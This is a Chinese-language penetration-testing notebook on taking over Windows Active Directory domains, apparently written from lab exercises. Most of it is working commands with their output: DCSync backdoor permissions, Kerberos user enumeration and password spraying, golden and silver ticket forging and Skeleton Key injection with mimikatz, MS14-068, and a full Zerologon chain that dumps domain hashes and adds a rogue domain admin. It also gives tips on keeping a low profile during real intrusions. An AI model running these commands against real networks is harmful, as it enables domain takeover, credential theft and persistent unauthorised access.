<a name="LFYKc"></a>
## Exchange邮箱结合Write Dcsync Acl打域控

内网进入域后，利用spn迅速定位邮箱，看看是不是exchange，如果是，直接锤<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1616088835374-3ef11c96-f028-4f37-8ffe-96964bd98494.png#averageHue=%23faf8f7&height=337&id=Dna8C&originHeight=449&originWidth=463&originalType=binary&ratio=1&rotation=0&showTitle=false&size=27521&status=done&style=none&title=&width=347)<br />为什么要锤邮箱，因为邮箱一般都是和企业组管理员捆绑的，Enterprise Admins组。这个组是具备Dcsync权限的，如果拥有Dcsync权限的话，是可以赋予域内任何一台机子可以拥有导出域内所有hash的能力的。<br />在密码抓取中有实践过。
<a name="RewNN"></a>
## Dcsync操作(可作后门
这个dcsync，默认是以下四大用户才会具备权限，只要拥有dcsync权限的用户，就能离线导出域内所有hash的权利。如果是域管，也可以赋予某个域内普通用户具备这个dcsync权限，从而实现后门的权限维持。
> · Administrators组内的用户。
> · Domain Admins组内的用户。
> · Enterprise Admins组内的用户。
> · 域控制器的计算机帐户


powerview.ps1中执行如下命令，该用户就具备dcsync权限。就能直接导出域内所有hash<br /> #给域用户hack添加DCSync权限，需要域管身份登陆RDP，才能赋予权限。<br />Add-DomainObjectAcl -TargetIdentity "DC=aufeng,DC=com" -PrincipalIdentity aufeng111 -Rights DCSync -Verbose<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1616129819981-3e23fa64-9cb2-4e81-a9e3-eade5878865e.png#averageHue=%230e0e0e&height=456&id=fRGM9&originHeight=608&originWidth=653&originalType=binary&ratio=1&rotation=0&showTitle=false&size=57231&status=done&style=none&title=&width=490)<br />**但是如果以域普通成员抓取mimikatz的话，是需要管理员权限的，所以域普通成员需要加入本地管理员组才行。**<br />**所以以域管身份登陆后，还得把域成员添加至本地管理员组。**<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1616131381908-0414d2aa-3ced-4207-8bd3-02f7bd131758.png#averageHue=%23e2e0dd&height=348&id=hwMeE&originHeight=696&originWidth=934&originalType=binary&ratio=1&rotation=0&showTitle=false&size=90724&status=done&style=none&title=&width=467)<br />如果只是域普通用户，但是只是调用CMD框的时候用了域管登陆，也是没办法赋予权限的。需要以域管身份登陆了才可以。<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1616130166978-955e0bd2-71d7-4435-9ff2-0dc7f510f885.png#averageHue=%23120e0e&height=324&id=qsdv8&originHeight=432&originWidth=654&originalType=binary&ratio=1&rotation=0&showTitle=false&size=45701&status=done&style=none&title=&width=491)<br />这个时候，在aufeng111的域普通账号上，就可以用Invoke-DCSync.ps1导出域内所有hash<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1616133897136-a0257c48-2c0c-4bcb-bdfe-e3a09a5ea5b0.png#averageHue=%23111111&height=214&id=ifFPo&originHeight=286&originWidth=651&originalType=binary&ratio=1&rotation=0&showTitle=false&size=18584&status=done&style=none&title=&width=488)<br /> <br />#域管给域用户hack删除DCSync权限<br />Remove-DomainObjectAcl -TargetIdentity "DC=aufeng,DC=com" -PrincipalIdentity aufeng111 -Rights DCSync -Verbose<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1616133685426-2ba0402a-b9c2-49b1-a072-6208a5b825bf.png#height=444&id=ULgYI&originHeight=591&originWidth=630&originalType=binary&ratio=1&rotation=0&showTitle=false&size=53296&status=done&style=none&title=&width=473)<br />这个时候密码就抓不出来了<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1616134170299-342d3d94-6977-472c-85ae-e5e720e9758f.png#height=378&id=HAwTY&originHeight=568&originWidth=662&originalType=binary&ratio=1&rotation=0&showTitle=false&size=20203&status=done&style=none&title=&width=440)
<a name="TJ83r"></a>
## 域内用户名枚举
由于Kerberos本身是一种基于身份认证的协议，所以也可对进行暴力破解或用户名枚举，并且不需要域用户下，只要攻击者所控的机器可以与域控的KDC正常通信即可（可以ping通）<br />我这里实验主要是域控administrator、域成员af、还有一台非域机。<br />![](https://cdn.nlark.com/yuque/0/2021/png/1345801/1615646355861-83677b4d-cbad-4a58-aa98-63eed6f78b0c.png#height=491&id=SzCal&originHeight=491&originWidth=732&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=732)
<a name="61Pnn"></a>
### nmap
nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='aufeng.com',userdb=C:\Users\ou\Desktop\user.txt 10.0.0.3<br />域是aufeng.com  字典位置在C:\Users\ou\Desktop\  域控ip是10.0.0.3<br />![](https://cdn.nlark.com/yuque/0/2021/png/1345801/1615646356390-be4e7468-8893-4377-9f0f-960ba68d4b14.png#height=271&id=bRr4V&originHeight=271&originWidth=965&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=965)

Msf也有类似的模块
> use auxiliary/gather/kerberos_enumusers
> set rhost [DC IP]
> set user_file 字典文件


Kerberos服务所在端口为88端口，采用tcp连接。<br />为何能利用Kerberos域进行用户枚举？<br />利用Kerberos错误代码进行判断 <br />用户分别有三种状态：启用、禁用、不存在。<br />三种状态的错误代码分别为：
> KDC_ERR_PREAUTH_REQUIRED-需要额外的预认证
> KDC_ERR_CLIENT_REVOKED-客户端凭证已被吊销
> KDC_ERR_C_PRINCIPAL_UNKNOWN-在Kerberos数据库中找不到客户端

爆破的时候直接抓包分析，并对10.0.0.3域控的所有请求筛选出来，可以看到如果存在这个域用户名就会有KDC_ERR_PREAUTH_REQUIRED的提示<br />![](https://cdn.nlark.com/yuque/0/2021/png/1345801/1615646356948-9bad9e2d-a67e-43c5-80dc-c884561bd378.png#height=715&id=Bwr1T&originHeight=715&originWidth=1244&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=1244)

![](https://cdn.nlark.com/yuque/0/2021/png/1345801/1615646357482-c203a9e7-d1f3-46db-9ae4-ea364e10b457.png#height=813&id=wPp9C&originHeight=813&originWidth=1242&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=1242)<br />但实际渗透中，你拿下内网非域机子后，别人可能没安装nmap，而你要在人家的机子上安装nmap动静太大，所以直接上传个kerbrute工具是最好不过的。

[https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe](https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe)
<a name="Ds8SD"></a>
### kerbrute_windows_amd64
kerbrute_windows_amd64.exe userenum --dc 10.0.0.3 -d aufeng.com user.txt<br />![](https://cdn.nlark.com/yuque/0/2021/png/1345801/1615646357934-4fb9a292-9f8f-46aa-a2cd-8f6572a616fe.png#height=309&id=ovOXw&originHeight=309&originWidth=975&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=975)<br />密码喷洒攻击<br />其实就是内网信息收集后，用同一个密码去爆破不同的用户名，去碰撞。实战这招屡试屡爽<br />kerbrute_windows_amd64.exe passwordspray --dc 10.0.0.3 -d aufeng.com user.txt Ou123456<br />![](https://cdn.nlark.com/yuque/0/2021/png/1345801/1615646358416-2c027d94-16c0-414c-aefa-bdfbba2e5f66.png#height=303&id=YeDEK&originHeight=303&originWidth=972&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=972)
<a name="428I7"></a>
### ADPwdSpray.py
**域内用户名枚举**<br />10.0.0.3是域控ip<br />python2 .\EnumADUser.py 10.0.0.3 aufeng.com .\user.txt tcp<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1626096237636-c84e4ce7-24e3-4b3a-b1bb-a4059cc7c848.png#height=160&id=Fw1h7&originHeight=213&originWidth=959&originalType=binary&ratio=1&rotation=0&showTitle=false&size=17901&status=done&style=none&title=&width=719)<br />**域内密码爆破**<br /> python2 .\ADPwdSpray.py 10.0.0.3 aufeng.com .\user.txt clearpassword Aa123456.* tcp<br /> ![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1626096495475-9cbe2a02-7f1b-46c7-a280-738cf3d2605f.png#height=153&id=gWOIT&originHeight=153&originWidth=1040&originalType=binary&ratio=1&rotation=0&showTitle=false&size=16467&status=done&style=none&title=&width=1040)

python2 ADPwdSpray.py 10.0.0.3 aufeng.com user.txt ntlmhash e00045bd566a1b74386f5c1e3612921b udp 

<a name="DAAA9"></a>
## 票据传递

<a name="z3ocC"></a>
### 清空票据再导入
```
//清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造
kerberos::purge
//查看当前机器凭证
kerberos::list
//将票据注⼊到内存中
kerberos::ptc xxx.ccache  或者是 kerberos::ptt ticket.kirbi
```
<a name="WpDPA"></a>
### 黄金票据(权限维持)
Golden Ticket由krbtgt的Hash加密<br />是需要获得了域中的 krbtgt 用户的 sid 值和哈希值 , 但是需要在域控中才能获得啊 (域控中操作) 相当于后门，如果入侵域控被发现了，管理员换了密码，但是krbtgt用户还会在，就能继续持续攻击

<a name="xceg8"></a>
#### 1、导出 krbtgt 密码 hash
在域控操作
```
mimikatz.exe "lsadump::dcsync /domain:aufeng.com /user:krbtgt"
```

![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1626243046278-077fcfe7-06e1-42fb-8e18-a77a2bc3a7bf.png#height=450&id=YS0U8&originHeight=600&originWidth=800&originalType=binary&ratio=1&rotation=0&showTitle=false&size=90883&status=done&style=none&title=&width=600)

<a name="rytEN"></a>
#### 2、获取域控的 SID
在域控操作<br />在导出 krbtgt 的 hash 的时候已经包含了域 SID，也可以用以下命令来查看域 SID
```
whoami /all
```
域控的sid要去掉后面的-500<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1626243796382-29de9e62-7a8d-407c-93a4-116e819b2bcf.png#height=326&id=ujqB4&originHeight=435&originWidth=659&originalType=binary&ratio=1&rotation=0&showTitle=false&size=27495&status=done&style=none&title=&width=494)<br />根据以上已经获取黄金票据所需的信息 

**krbtgt hash : 587a198944ae8c18f8106e47a3030281**<br />**域控sid: S-1-5-21-328449661-375435731-1527784320**<br />**域控主机名 WIN-RQP1EWJL1WV**

<a name="Pj2T9"></a>
#### 3、在普通域用户生成票据并导入票据
票据生成
```
mimikatz.exe "kerberos::golden /user:WIN-RQP1EWJL1WV /domain:aufeng.com /sid:S-1-5-21-328449661-375435731-1527784320 /krbtgt:587a198944ae8c18f8106e47a3030281"
```
<a name="fgXdr"></a>
#### ![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1626244422233-b17faf7b-d0d4-4de0-983f-6bd07b4cb201.png#height=664&id=ldb8a&originHeight=886&originWidth=1235&originalType=binary&ratio=1&rotation=0&showTitle=false&size=459591&status=done&style=none&title=&width=926)
导入krb的票据<br />mimikatz.exe "kerberos::ptt ticket.kirbi" exit<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1626244678915-3e328072-3cab-4b64-8874-b91621a4d65b.png#height=665&id=v88nC&originHeight=886&originWidth=1282&originalType=binary&ratio=1&rotation=0&showTitle=false&size=377553&status=done&style=none&title=&width=962)<br />获得票据后可直接通过 dir 远程访问域控，可以直接使用 ipc 进行连接:<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1626244746122-2b6d71da-a23b-4503-9555-60a0f0f17f68.png#height=665&id=H6hVq&originHeight=886&originWidth=1282&originalType=binary&ratio=1&rotation=0&showTitle=false&size=500394&status=done&style=none&title=&width=962)<br />当然也可以使用 psexec 去获得一个 cmdshell:

klist purge 清除票据<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1626245942156-e760c257-25a1-4e38-9fe3-62d576782652.png#height=330&id=k0vyO&originHeight=439&originWidth=822&originalType=binary&ratio=1&rotation=0&showTitle=false&size=38201&status=done&style=none&title=&width=617)
> 注:普通黄金票据不能跨域使用;TGT 有效时间为 20 分钟;。


<a name="asDBi"></a>
### 白银票据

该票据同样需要3大条件：<br />1、目标服务的SID<br />2、目标服务的NTLM hash<br />3、目标服务的主机名<br />-------------------------------------------------------------------<br />win7域普通成员，无法访问域控<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1626248050894-3cd97644-5db3-4bd2-ba26-fe20f3cb9ef4.png#height=143&id=O6sVw&originHeight=191&originWidth=705&originalType=binary&ratio=1&rotation=0&showTitle=false&size=15768&status=done&style=none&title=&width=529)
<a name="TFJ8R"></a>
#### 1、获取目标服务的信息
（在域控操作）获取域控本地管理员的ntml hash<br />这里其实也就是目标服务的hash<br />这里的NTLM作为rc4使用<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1626248136665-555104b1-6c7c-41cb-aca2-8b48bfbbe7d7.png#height=398&id=nr7e1&originHeight=531&originWidth=697&originalType=binary&ratio=1&rotation=0&showTitle=false&size=40951&status=done&style=none&title=&width=523)<br />获取目标服务的SID<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1626248273654-4fabd4a9-7276-48c6-bad3-72b1fa28a810.png#height=158&id=LEfMq&originHeight=158&originWidth=542&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6077&status=done&style=none&title=&width=542)
<a name="4VgDr"></a>
#### 2、白银票据伪造
```
mimikatz.exe "kerberos::golden /user:AF /domain:aufeng.com /service:cifs /target:WIN-RQP1EWJL1WV.aufeng.com /sid:S-1-5-21-328449661-375435731-1527784320 /rc4:50b25636a69c1733822b47edf3384c45" exit
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1626247772229-b6cf9831-2b89-40c6-b4a8-4933cda19f64.png#height=450&id=VPovl&originHeight=600&originWidth=822&originalType=binary&ratio=1&rotation=0&showTitle=false&size=72346&status=done&style=none&title=&width=617)<br />mimikatz.exe "kerberos::ptt ticket.kirbi" exit<br />dir成功访问目标服务(域控)<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1626248015014-dbe7bc02-7d32-48f5-9e5f-3215abeceff7.png#height=376&id=ASUdg&originHeight=501&originWidth=784&originalType=binary&ratio=1&rotation=0&showTitle=false&size=49781&status=done&style=none&title=&width=588)
<a name="gy5MW"></a>
## **Skeleton Key (域内统一密码 **mimikatz**) 权限维持**
> - 向域控制器注入Skeleton Key的方法，只能在64位操作系统中使用，包括Windows Server2012R2、Windows Server2012、Windows Server2008、Windows Server2008R2、Windows Server 2003R2、Windows Server 2003
> - 只有具有域管理员权限的用户可以将Skeleton Key注入域控制器的lsass.exe进程
> - Skeleton Key被注入后，用户使用现有的密码仍然可以登录系统
> - 因为Skeleton Key是被注入lsass.exe进程的，所以它只存在于内存中。如果域控制器重启，注入的Skeleton Key将会失效。


在域控上，使用mimikatz注入Skeleton Key，注入成功后。会在域内的所有账号中添加万能密码：mimikatz 。重启后会失效。

mimikatz.exe privilege::debug "misc::skeleton"<br />或者分开<br />privilege::debug<br />misc::skeleton<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611466990571-a733c534-f6ad-4c60-856e-4cd3cf91ad15.png#height=291&id=NPOex&originHeight=388&originWidth=527&originalType=binary&ratio=1&rotation=0&showTitle=false&size=56173&status=done&style=none&title=&width=395)<br />接下来RDP或者ipc啥的，我们就可以以域内任何用户，密码：mimikatz 登录。

<a name="uCYVa"></a>
### 绕过
如果碰到以下情况，还是可以进行绕过的<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611467151764-ab8218f4-b2ac-4f66-b2a3-00020681ff7c.png#height=158&id=uaLPk&originHeight=316&originWidth=775&originalType=binary&ratio=1&rotation=0&showTitle=false&size=156958&status=done&style=none&title=&width=387.5)<br />绕过lsa保护策略<br />mimikatz已经支持绕过lsa，该功能需要 mimidrv.sys 文件。<br />依次执行命令:
> privilege::debug
> !+
> !processprotect /process:lsass.exe /remove
> misc::skeleton

![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611467217710-d15badb4-f784-405b-9da6-512c683c8c8b.png#height=332&id=Fr8qC&originHeight=442&originWidth=593&originalType=binary&ratio=1&rotation=0&showTitle=false&size=137341&status=done&style=none&title=&width=445)<br />然后就成功以mimikatz密码登陆了<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611467247403-28b13c72-1896-4d72-8e28-39c89ea00f03.png#height=200&id=tiHU9&originHeight=399&originWidth=790&originalType=binary&ratio=1&rotation=0&showTitle=false&size=155213&status=done&style=none&title=&width=395)
<a name="QhAx5"></a>
## MS14-068 （域内普通成员打域控）
**域控也可以添加域管理员账号**，并且成功登陆其他机子<br /> <br />MS14-068编号CVE-2014-6324，补丁为3011780、打成功后具备域管理员权限<br />注入票据时，机器不能是03或xp，因为mimikatz不支持这两个机器注入<br />步骤1、<br />需要用MS14-068.exe<br />MS14-068.exe -u af@aufeng.com -p Ou123456 -s S-1-5-21-2189311154-2766837956-1982445477-1110 -d 192.168.10.171  <br />#MS14-068.exe -u 域用户@aufeng.com -p 域用户af密码 -s 域用户af的SID -d 域控ip<br />然后在ms14.exe的目录下会生成票据<br />步骤2、<br />用mimikatz导入票据<br />mimikatz#kerberos::ptc C:\Users\AF.AUFENG\Desktop\MS14-068\TGT_af@aufeng.com.ccache<br />步骤3、<br />需要把域控共享的c盘移植到其他盘(不存在的盘) ，然后建立成一个会话<br />![](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611394476067-56d57304-89fd-46bf-9c8f-3c91fd9cc060.png#height=368&id=X7ldu&originHeight=491&originWidth=609&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=457)<br />这时候域成员就会挂载一个域控的盘<br />![](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611394476347-68bc7b73-d04d-4931-85a2-86bbfb178afb.png#height=307&id=SzQ8v&originHeight=409&originWidth=514&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=386)<br /> 
<a name="D90Hu"></a>
### 使用psexec拿下域控dos命令框
Psexec.exe -accepteula \\WIN-RQP1EWJL1WV.aufeng.com -s cmd.exe （只能是机器名psexec，ip不成功，Psexec有可能用32位的才能成功）<br />![](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611394476604-b6fe4c34-9d42-45af-87a6-482001555762.png#height=185&id=Jw3sM&originHeight=328&originWidth=646&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=365)
<a name="2u5fr"></a>
### 利用会话，使用定时计划
思路与横向渗透一致，但是必须是域控的机器名，ip是无法成功的，net time /domain看机器名<br />![](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611394476811-98df5bb4-a102-4267-8ed0-ebe5a99e16ae.png#height=119&id=gSxYi&originHeight=184&originWidth=640&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=415)<br /> 
<a name="35Lj8"></a>
## Netlogon 特权提升漏洞复现（CVE-2020-1472）

[https://sec.nmask.cn/article_content?a_id=79e344debce9e8a3603ca5ff2c9ad018](https://sec.nmask.cn/article_content?a_id=79e344debce9e8a3603ca5ff2c9ad018)<br />进入内网后直接扫88端口，和445端口，445端口可以用来识别工作组或者域环境，88端口一般都是域控才会开的端口，因为是krb协议。<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1614826216145-258a9467-47e9-4a0a-a692-29a6be24080b.png#height=211&id=pTW90&originHeight=421&originWidth=1021&originalType=binary&ratio=1&rotation=0&showTitle=false&size=331587&status=done&style=none&title=&width=510.5)

先探测有无漏洞<br /> python zerologon_tester.py owa 1.1.1.20<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1614826245812-9e89cc18-17ae-4773-a578-c7b12148a3b1.png#height=100&id=E70Iq&originHeight=200&originWidth=1000&originalType=binary&ratio=1&rotation=0&showTitle=false&size=116793&status=done&style=none&title=&width=500)<br />存在漏洞之后再把密码重置<br />python set_empty_pw.py 机器名 ip<br /> <br />密码重置后利用脚本看重置后的hash<br />python secretsdump.py -no-pass -just-dc god.org/owa$@192.168.52.138<br />![](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611394477086-7d3ee11c-998a-4cdb-9307-256dce0303c6.png#height=236&id=TjryU&originHeight=503&originWidth=801&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=376)

secretsdump.py是impacket包中的python脚本<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1614781114334-b94bbfd6-10b0-4257-ac3a-a9d1d066e71e.png#height=211&id=lGlvT&originHeight=421&originWidth=807&originalType=binary&ratio=1&rotation=0&showTitle=false&size=31097&status=done&style=none&title=&width=403.5)<br />并利用重置后的hash横向登入域<br />python wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:81be2f80d568100549beac645d6a7141 god.org/administrator@192.168.52.138

然后直接添加一波域管账户密码 <br />net user aufeng root@123 /add /domain<br />net group "domain admins" aufeng /add /domain




利用域控的身份，直接添加域管，然后再用sam取出
> > reg save HKLM\SYSTEM system.save
> > reg save HKLM\SAM sam.save
> > reg save HKLM\SECURITY security.save
> > get system.save
> > get sam.save
> > get security.save
> > del /f system.save
> > del /f sam.save
> > del /f security.save

利用sam查看修改之前的hash<br />python secretsdump.py -sam sam.save -system system.save -security security.save LOCAL<br /> ![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1614789638464-3e146d85-94c1-4d26-99eb-039440bed946.png#height=361&id=AWL1D&originHeight=481&originWidth=770&originalType=binary&ratio=1&rotation=0&showTitle=false&size=499482&status=done&style=none&title=&width=578)<br />`$MACHINE.ACC`后面的就是原来的机器哈希<br />![](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611394477659-ab6bebbc-81fe-44b7-abae-cf3e18eab300.png#height=365&id=RHjrE&originHeight=486&originWidth=789&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=592)<br />然后恢复域的hash<br />python3 reinstall_original_pw.py owa 1.1.1.20 2be10fb298aa42d3c09f77af5a30febd<br /> ![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1614789194652-04c62112-c26e-4e99-8149-225ef015d980.png#height=320&id=Xmttq&originHeight=427&originWidth=893&originalType=binary&ratio=1&rotation=0&showTitle=false&size=154999&status=done&style=none&title=&width=670)

可以用<br />proxychains python secretsdump.py god.org/'owa$'@1.1.1.20 -no-pass<br />再检测是不是空密码可以dump东西，<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1614789262453-af4f3c75-bb9d-4cd6-b0ed-a3e6425cba38.png#height=121&id=gzhEh&originHeight=162&originWidth=1363&originalType=binary&ratio=1&rotation=0&showTitle=false&size=79830&status=done&style=none&title=&width=1022)


-----------------
<a name="CVg6R"></a>
## Netlogon（CVE-2020-1472）再复现
攻击路线如下。<br />![](https://cdn.nlark.com/yuque/0/2021/png/1345801/1614826454293-23f9d298-1641-49f6-a9f3-b4c316ac5721.png#height=355&id=Vth8n&originHeight=355&originWidth=765&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=765)<br />挂上代理之后，通过信息收集获取内网主机1.1.1.20<br />![](https://cdn.nlark.com/yuque/0/2021/png/1345801/1614826454579-a64f4bf7-4c1c-4684-8917-de0eef9909c8.png#height=453&id=Ul1kk&originHeight=453&originWidth=1171&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=1171)<br />通过端口扫描发现，该主机开放了88端口和53端口，一般域控都会开启dns和88端口的krb协议，并且445端口中探测出来存在GOD域，主机名为OWA。<br />![](https://cdn.nlark.com/yuque/0/2021/png/1345801/1614826454929-5c6cec81-12ec-4467-9e4d-7a8e17fe1194.png#height=368&id=QGqkB&originHeight=368&originWidth=882&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=882)<br />所以考虑内网尝试一下打Netlogon<br />考虑到入口的主机是linux，不像windows那样比较方便的获取主机名，并且确定一下漏扫是否有误报，所以用OXID获取主机名，确认是owa无误。<br />![](https://cdn.nlark.com/yuque/0/2021/png/1345801/1614826455309-ef804c1e-0c34-4418-b927-8c0b98d4c378.png#height=279&id=hsAzG&originHeight=279&originWidth=873&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=873)<br />利用CVE-2020-1472的poc打过去，返回是 Success。确认是存在漏洞，可以进一步获取域管权限<br />python zerologon_tester.py owa 1.1.1.20<br />![](https://cdn.nlark.com/yuque/0/2021/png/1345801/1614826455633-a5a7a16d-2d8b-48ce-a353-923fbb1af7ba.png#height=195&id=O75Ti&originHeight=195&originWidth=1204&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=1204)<br />利用[https://github.com/risksense/zerologon](https://github.com/risksense/zerologon)中的脚本把域控密码清零。<br />python set_empty_pw.py owa 1.1.1.20<br />Success！字段就是打成功了。如果失败的话，会有延时的英文字段<br />![](https://cdn.nlark.com/yuque/0/2021/png/1345801/1614826455949-4a6803cb-3ced-4936-b9d7-2692ae7aa27d.png#height=347&id=kFwo5&originHeight=347&originWidth=902&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=902)


在kali中安装好impacket包<br />项目地址：[https://github.com/SecureAuthCorp/impacket](https://github.com/SecureAuthCorp/impacket)<br />git clone [https://github.com/CoreSecurity/impacket.git](https://github.com/CoreSecurity/impacket.git)<br />cd impacket/<br />python setup.py install

安装好impacket包之后，利用从impacket中的secretsdump脚本(在examples目录下) NTDS.DIT文件远程dump域内所有密码哈希。Kali走上代理流量直接打<br />proxychains python secretsdump.py god.org/'owa$'@1.1.1.20 -no-pass<br />![](https://cdn.nlark.com/yuque/0/2021/png/1345801/1614826456260-aafbf648-502d-4d93-aeec-27ac4b7c41c7.png#height=780&id=BBPSb&originHeight=780&originWidth=1005&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=1005)<br />利用域管的哈希横向过去<br />python .\wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:ed74a5f9126e59fad90675a5df9650c4 god.org/administrator@1.1.1.20<br />![](https://cdn.nlark.com/yuque/0/2021/png/1345801/1614826456619-fcdcdb2d-f0a1-46b6-99e9-aa1268ab58fb.png#height=651&id=EuWhW&originHeight=651&originWidth=1183&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=1183)<br />横向获取了域管权限之后，直接添加一波域管<br />net user aufeng root@123 /add /domain<br />net group "domain admins" aufeng /add /domain<br />再查看，确定是domain admins权限。<br />![](https://cdn.nlark.com/yuque/0/2021/png/1345801/1614826456984-9c20404f-69f4-465e-b57f-7a595a125e7c.png#height=597&id=uHRKQ&originHeight=597&originWidth=901&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=901)<br />为了防止出现脱域的情况，需要恢复一波账户密码，步骤如下

> reg save HKLM\SYSTEM system.save<br />> reg save HKLM\SAM sam.save<br />> reg save HKLM\SECURITY security.save<br />> get system.save<br />> get sam.save<br />> get security.save<br />> del /f system.save<br />> del /f sam.save<br />> del /f security.save<br />但有时候会出现其他的情况，例如<br />![](https://cdn.nlark.com/yuque/0/2021/png/1345801/1614826457278-5220b5c5-e8b9-41c1-a82e-2f05805eda5c.png#height=250&id=PVyrR&originHeight=250&originWidth=831&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=831)<br />但是这个时候，可以把save后缀修改为其他后缀，导出来后再修复为save就可以<br />![](https://cdn.nlark.com/yuque/0/2021/png/1345801/1614826457613-4f288694-ccd6-460c-ba36-05ca0a3e5da0.png#height=379&id=D7BHP&originHeight=379&originWidth=920&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=920)<br />把3个save文件都放置在secretsdump脚本的目录下，获取MACHINE.ACC的哈希值<br />python secretsdump.py -sam sam.save -system system.save -security security.save LOCAL<br />![](https://cdn.nlark.com/yuque/0/2021/png/1345801/1614826457904-abcb19e2-e62d-4905-8d53-ecc3955966b2.png#height=569&id=XkhLo&originHeight=569&originWidth=900&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=900)<br />然后再利用reinstall_original_pw脚本恢复域控的密码。<br />python .\reinstall_original_pw.py owa 1.1.1.20 ed2fc29a9f837ab4c44535d2a2545861

![](https://cdn.nlark.com/yuque/0/2021/png/1345801/1614826458292-d360cc27-8735-4c98-a54d-583699ce73a0.png#height=593&id=gCdHJ&originHeight=593&originWidth=1205&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=1205)<br />再检测一下是否空密码可以登陆，如果失败了，那就是恢复密码成功<br />proxychains python secretsdump.py god.org/'owa$'@1.1.1.20 -no-pass<br />![](https://cdn.nlark.com/yuque/0/2021/png/1345801/1614826458736-6e16d88e-1c51-49c8-a805-18ce9fb78d9f.png#height=89&id=jq1bn&originHeight=89&originWidth=931&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=931)

 
<a name="HG4pA"></a>
## 域管理员进程
需要本地管理员才能看到，使用tasklist /v，输出到文本啥的。可以想办法上线cs、msf啥的进程迁移到域管理员进程，然后添加域管理员账号<br />需要administrator权限才能看到域管理员，其他本地管理员组是无法看到的域管理员进程的<br />![](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611394477983-2e80cb21-af57-4d1c-906a-4f3f6636d5f0.png#height=226&id=Asa0V&originHeight=881&originWidth=1741&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=447)<br /> 
<a name="OChww"></a>
### 定位域管
<a name="c7x3P"></a>
#### Psloggedon
·       -l：仅显示本地登录，不显示本地和网络资源登录<br />·       -x：不显示登录时间<br />·       \\计算机名：指定要列出登录信息的计算机的名称<br />·       用户名：指定用户名，在网络中搜索该用户登录的计算机，该功能实现有问题(需要管理员权限

